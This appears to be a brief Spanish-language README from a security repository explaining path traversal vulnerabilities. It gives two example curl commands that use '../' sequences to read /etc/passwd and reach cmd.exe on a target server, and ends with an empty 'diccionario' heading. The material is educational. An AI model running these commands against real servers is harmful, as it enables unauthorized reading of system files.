## directoriotrasversal

Path Traversal (o Directory Traversal) es una vulnerabilidad web que permite a un atacante acceder a archivos y directorios fuera del directorio raíz del servidor web.

se manipula parámetros de la URL o inputs que contienen rutas de archivos (como ../../) para moverse por las carpertas del servidor.

Si el servidor no valida correctamente las entradas, puede exponer archivos sensibles como:

Configuraciones (/etc/passwd en Linux).
#
## ejemplos simples para explotar la vulnerabilidade de directorio trasversal o path traversal:

curl --path-as-is -k -v http://ip:80/../../../../../etc/passwd

<img style="float:left" alt="Path traversal simple" src="https://github.com/hackingyseguridad/directoriotraversal/blob/master/pathtraversal.png">

curl --path-as-is -k -v http://ip:80/../../../../../../windows/system32/cmd.exe

## diccionario path traversal 





## http://www.hackingyseguridad.com

Codigos de respuesta HTTP https://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html
